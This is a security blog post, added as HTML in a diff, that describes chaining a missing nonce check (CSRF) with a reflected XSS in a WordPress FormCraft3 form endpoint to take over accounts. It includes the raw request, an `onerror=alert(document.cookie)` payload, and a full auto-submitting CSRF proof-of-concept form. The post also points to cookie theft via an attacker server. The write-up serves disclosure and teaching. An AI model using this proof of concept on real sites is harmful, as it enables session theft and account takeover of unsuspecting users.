@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CSRF Chained To XSS Leading To Account Takeover | SecFortress</title>
+<meta name="keywords" content="">
+<meta name="description" content="In this blog, I found an XSS vulnerability chained together with a CSRF misconfiguration on a live target leading to ATO">
+<meta name="author" content="SecFortress">
+<link rel="canonical" href="http://localhost:1313/hacking/csrf_chained_xss_leading_to_account_takeover/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.89ca4972ab5e6aaa05e9a0dae0c4bb64b26585bc79e36f5cf33614eea0283abe.css" integrity="sha256-icpJcqteaqoF6aDa4MS7ZLJlhbx5429c8zYU7qAoOr4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/csrf_chained_xss_leading_to_account_takeover/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://localhost:1313/hacking/csrf_chained_xss_leading_to_account_takeover/">
+  <meta property="og:site_name" content="SecFortress">
+  <meta property="og:title" content="CSRF Chained To XSS Leading To Account Takeover">
+  <meta property="og:description" content="In this blog, I found an XSS vulnerability chained together with a CSRF misconfiguration on a live target leading to ATO">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hacking">
+    <meta property="article:published_time" content="2026-10-27T22:56:23+01:00">
+    <meta property="article:modified_time" content="2026-10-27T22:56:23+01:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CSRF Chained To XSS Leading To Account Takeover">
+  <meta name="twitter:description" content="In this blog, I found an XSS vulnerability chained together with a CSRF misconfiguration on a live target leading to ATO">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hackings",
+      "item": "http://localhost:1313/hacking/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CSRF Chained To XSS Leading To Account Takeover",
+      "item": "http://localhost:1313/hacking/csrf_chained_xss_leading_to_account_takeover/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CSRF Chained To XSS Leading To Account Takeover",
+  "name": "CSRF Chained To XSS Leading To Account Takeover",
+  "description": "In this blog, I found an XSS vulnerability chained together with a CSRF misconfiguration on a live target leading to ATO",
+  "keywords": [
+    
+  ],
+  "articleBody": "In this blog, I discovered a Cross-Site Scripting (XSS) vulnerability, a bug that can allow an attacker to execute malicious JavaScript in another user’s browser, and chained it with a Cross-Site Request Forgery (CSRF) misconfiguration, which can trick a logged-in user’s browser into performing unwanted actions. Together, these flaws created a path to Account Takeover (ATO), potentially allowing an attacker to gain control of another user’s account.\nRecently Came across a web application with the below request field\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: example.com action=formcraft3_form_submit\u0026field1=REDACTED\u0026website=\u0026id=2\u0026location=\u0026emails=REDACTED\u0026hidden=\u0026redirect=\u0026type=all\u0026triggerIntegration=undefined\u0026fieldLabels=undefined\u0026formcraft3_wpnonce=undefined The POST data included the formcraft3_wpnonce=undefined parameter, Literally the string “undefined,” not a real nonce and the server still accepted it. That tells us the endpoint either:\ndoesn’t check the nonce at all for this action, or checks for its presence but doesn’t actually validate it against a server-side expected value Either way, the server has no way to distinguish “a request that originated from the real form on the real page” from “a request forged by any arbitrary site.” This is the entire CSRF vulnerability in one line, nonces exist specifically to prove the request came from a page the server itself rendered for that user’s session.\nAttaching the XSS payload (img src=/ onerror=alert(document.cookie)) on the redirect= parameter get triggered with the below response\nHTTP/1.1 200 OK {\"errors\":[],\"success\":\"Message received\",\"submission_id\":2027,\"debug\":{\"failed\":[\"Email Not Sent: Email setup error\"]},\"redirect\":\"\"} Since this is affected by the login workflow we can go ahead and create a CSRF PoC\n\u003c!DOCTYPE html\u003e\rCSRF PoC - FormCraft3 Form Submission (admin-ajax.php)\rOnce the user logins to the legitimate website they can go to our hosted CSRF PoC website and they would be redirected to the legitimate website with their cookie stolen to the attacker server\nIn other to craft the cookie stealer payload, you can use this my blog to learn how to do this.\nWordfence was deployed by the client shortly after this testing, so further live verification wasn’t possible; the sink behavior below was reproduced locally to illustrate impact, 😛.\nArigato gozaimasu 3\u003e\n",
+  "wordCount" : "393",
+  "inLanguage": "en",
+  "datePublished": "2026-10-27T22:56:23+01:00",
+  "dateModified": "2026-10-27T22:56:23+01:00",
+  "author":{
+    "@type": "Person",
+    "name": "SecFortress"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/hacking/csrf_chained_xss_leading_to_account_takeover/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "SecFortress",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="SecFortress (Alt + H)">
+                <img src="http://localhost:1313/images/avatar.jpeg" alt="" aria-label="logo"
+                    height="25">SecFortress</a>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/hacking" title="🥷 Hacking">
+                    <span>🥷 Hacking</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://sec-fortress.github.io/" title="✍️ Notes">
+                    <span>✍️ Notes</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/whoami" title="🇳🇬 Whoami">
+                    <span>🇳🇬 Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/hacking/">Hackings</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+    <h1 class="post-title entry-hint-parent">
+      CSRF Chained To XSS Leading To Account Takeover
+    </h1>
+    <div class="post-description">
+      In this blog, I found an XSS vulnerability chained together with a CSRF misconfiguration on a live target leading to ATO
+    </div>
+    <div class="post-meta">
+
+<span title='2026-10-27 22:56:23 +0100 WAT'>October 27, 2026</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>SecFortress</span>
+
+</div>
+  </header> 
+
+  <div class="post-content md-content"><p>In this blog, I discovered a <strong>Cross-Site Scripting (XSS)</strong> vulnerability, a bug that can allow an attacker to execute malicious JavaScript in another user&rsquo;s browser, and chained it with a <strong>Cross-Site Request Forgery (CSRF)</strong> misconfiguration, which can trick a logged-in user’s browser into performing unwanted actions. Together, these flaws created a path to <strong>Account Takeover (ATO)</strong>, potentially allowing an attacker to <em>gain control of another user&rsquo;s account</em>.</p>
+<p>Recently Came across a web application with the below request field</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">POST /wp-admin/admin-ajax.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: example.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">action</span><span class="o">=</span>formcraft3_form_submit<span class="p">&amp;</span><span class="nv">field1</span><span class="o">=</span>REDACTED<span class="p">&amp;</span><span class="nv">website</span><span class="o">=</span><span class="p">&amp;</span><span class="nv">id</span><span class="o">=</span>2<span class="p">&amp;</span><span class="nv">location</span><span class="o">=</span><span class="p">&amp;</span><span class="nv">emails</span><span class="o">=</span>REDACTED<span class="p">&amp;</span><span class="nv">hidden</span><span class="o">=</span><span class="p">&amp;</span><span class="nv">redirect</span><span class="o">=</span><span class="p">&amp;</span><span class="nv">type</span><span class="o">=</span>all<span class="p">&amp;</span><span class="nv">triggerIntegration</span><span class="o">=</span>undefined<span class="p">&amp;</span><span class="nv">fieldLabels</span><span class="o">=</span>undefined<span class="p">&amp;</span><span class="nv">formcraft3_wpnonce</span><span class="o">=</span>undefined
+</span></span></code></pre></div><p>The POST data included the <code>formcraft3_wpnonce=undefined</code> parameter, Literally the string “<strong>undefined</strong>,” not a real nonce and the server still accepted it. That tells us the endpoint either:</p>
+<ul>
+<li>doesn’t check the nonce at all for this action, or</li>
+<li>checks for its <em>presence</em> but doesn’t actually validate it against a server-side expected value</li>
+</ul>
+<p>Either way, the server has no way to distinguish “a request that originated from the real form on the real page” from “a request forged by any arbitrary site.” This is the entire CSRF vulnerability in one line, nonces exist specifically to prove the request came from a page the server itself rendered for that user’s session.</p>
+<p>Attaching the XSS payload (<code>img src=/ onerror=alert(document.cookie)</code>) on the <code>redirect=</code> parameter get triggered with the below response</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;errors&#34;</span>:<span class="o">[]</span>,<span class="s2">&#34;success&#34;</span>:<span class="s2">&#34;Message received&#34;</span>,<span class="s2">&#34;submission_id&#34;</span>:2027,<span class="s2">&#34;debug&#34;</span>:<span class="o">{</span><span class="s2">&#34;failed&#34;</span>:<span class="o">[</span><span class="s2">&#34;Email Not Sent: Email setup error&#34;</span><span class="o">]}</span>,<span class="s2">&#34;redirect&#34;</span>:<span class="s2">&#34;&lt;img src=\/ onerror=alert(document.cookie)&gt;&#34;</span><span class="o">}</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/GyF1BEm.png"></p>
+<p>Since this is affected by the login workflow we can go ahead and create a CSRF PoC</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;h3&gt;CSRF PoC - FormCraft3 Form Submission (admin-ajax.php)&lt;/h3&gt;
+&lt;form id=&#34;csrf-poc&#34; action=&#34;https://example.com/wp-admin/admin-ajax.php&#34; method=&#34;POST&#34;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;action&#34; value=&#34;formcraft3_form_submit&#34;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;field1&#34; value=&#34;attacker-controlled@evil.com&#34;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;website&#34; value=&#34;&#34;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;id&#34; value=&#34;2&#34;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;location&#34; value=&#34;https://example.com/&#34;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;emails&#34; value=&#34;attacker-controlled@evil.com&#34;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;hidden&#34; value=&#34;&#34;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;redirect&#34; value=&#39;&amp;lt;img src=/ onerror=alert(document.cookie)&amp;gt;&#39;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;type&#34; value=&#34;all&#34;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;triggerIntegration&#34; value=&#34;undefined&#34;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;fieldLabels&#34; value=&#34;undefined&#34;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;formcraft3_wpnonce&#34; value=&#34;undefined&#34;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  document.getElementById(&#39;csrf-poc&#39;).submit();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>Once the user logins to the legitimate website they can go to our hosted CSRF PoC website and they would be redirected to the legitimate website with their cookie stolen to the attacker server</p>
+<p>In other to craft the cookie stealer payload, you can use this my <a href="https://sec-fortress.github.io/posts/articles/posts/Exfiltrating%20Cookies%20Through%20Stored%20XSS.html">blog</a> to learn how to do this.</p>
+<p>Wordfence was deployed by the client shortly after this testing, so further live verification wasn’t possible; the sink behavior below was reproduced locally to illustrate impact, 😛.</p>
+<p><img loading="lazy" src="https://i.imgur.com/Rql8EG7.png"></p>
+<p>Arigato gozaimasu 3&gt;</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/hacking/are_you_a_hacker/">
+    <span class="title">« Prev</span>
+    <span>Am I a hecker yet 🤔? CVE-2024-44871 and CVE-2024-44872!</span>
+  </a>
+  <a class="next" href="http://localhost:1313/hacking/we_must_keep_fighting/">
+    <span class="title">Next »</span>
+    <span>WE MUST KEEP FIGHTING!&gt;</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">SecFortress</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
